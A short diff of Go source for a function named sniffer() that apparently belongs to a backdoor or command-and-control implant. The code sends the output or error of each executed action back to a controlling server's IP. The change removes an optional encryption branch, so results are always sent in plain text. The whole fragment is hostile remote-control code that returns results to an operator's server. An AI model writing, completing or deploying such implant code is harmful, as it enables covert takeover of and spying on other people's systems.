@@ -198,21 +198,10 @@ func sniffer() {
 				}
 			}
 			if err != nil {
-				if SSM {
-					Send(encrypt(string(err.Error())), ip, ServerIP.DstIP.String())
-				} else {
-					Send(string(err.Error()), ip, ServerIP.DstIP.String())
-				}
-
+				Send(string(err.Error()), ip, ServerIP.DstIP.String())
 			} else {
-				if SSM {
-					Send(encrypt(string(out)), ip, ServerIP.DstIP.String())
-				} else {
-					Send(string(out), ip, ServerIP.DstIP.String())
-				}
-
+				Send(string(out), ip, ServerIP.DstIP.String())
 			}
-
 		} else {
 			continue
 		}
